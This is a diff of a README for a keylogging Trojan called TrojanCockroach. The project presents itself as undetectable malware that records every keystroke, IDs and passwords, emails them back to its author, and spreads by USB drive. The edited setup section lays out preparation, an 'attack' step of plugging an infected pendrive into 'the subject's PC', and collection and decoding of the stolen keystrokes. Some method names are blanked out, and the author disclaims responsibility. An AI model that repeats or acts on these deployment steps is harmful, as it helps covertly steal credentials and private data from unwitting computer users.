@@ -5,17 +5,27 @@
 <a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is an undetectable **Trojan Virus** that steals data (ID, password; every key stroke) from PC and emails it back to the author. It spreads among PCs through USB drives.
 
 ### Setup
-1. Change **---()** and **---()** method of **TrojanCockroach.cpp** according to your wish.
-2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
-3. Place **TrojanCockroach.exe**, **Infect.exe**, **---**, **---** & **---** in the same folder.
-4. Now run **TrojanCockroach.exe**.
-5. Then insert a pendrive in your PC (see the magic!).
-6. Now, insert the USB-Drive in the subject's PC and run the created shortcut for affecting.
-7. After getting the email run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
+1. Preparation
+  1. Change **---()** and **---()** method of **TrojanCockroach.cpp** according to your wish.
+  2. Compile **TrojanCockroach.cpp** & **Infect.cpp** (do not rename them).
+  3. Place **TrojanCockroach.exe**, **Infect.exe**, **---**, **---** & **---** in the same folder.
+  4. Now run **TrojanCockroach.exe**.
+  5. Then insert a pendrive in your PC (see the magic!).
 
-You can get a more clear understanding from the pre-project of **TrojanCockroach**- **[KeyLogger](https://github.com/MinhasKamal/KeyLogger)**.
+2. Attack
+  1. Now, insert the USB-Drive in the subject's PC (Yes, you have to start the spreading process from somewhere!)
+  2. Run the shortcut and the spyware will be injected.
 
-**Note:** I do not want newbies to abuse my project, so I am not revealing all the secrets. I also have made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty. I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.
+3. Data Collection
+  1. You need to wait several days (depending on the number of power on/off of the PC), before getting any data.
+  2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that ---.
+  3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
+
+You can get a more clear understanding of the project from its pre-project- **[KeyLogger](https://github.com/MinhasKamal/KeyLogger)**.
+
+**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. I also have made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty.
+
+I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.
 
 
 ### License
